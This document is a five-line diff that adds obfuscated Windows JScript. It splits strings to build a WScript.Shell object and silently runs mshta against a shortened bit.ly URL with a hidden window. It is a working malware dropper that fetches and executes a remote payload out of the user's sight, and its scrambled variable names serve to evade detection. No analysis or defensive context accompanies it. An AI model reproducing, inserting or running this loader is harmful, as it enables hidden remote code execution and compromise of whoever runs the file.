@@ -1,0 +1,5 @@
+taeeawsi = ("cript.Sh")
+var ismggxpp = WScript.CreateObject("WS"+taeeawsi+"ell")
+kikrxzij = ("msh")
+hxokqwnu = ("ta ")
+ismggxpp.Run((kikrxzij+hxokqwnu)+" https://bit.ly/3vBcbH5",0)
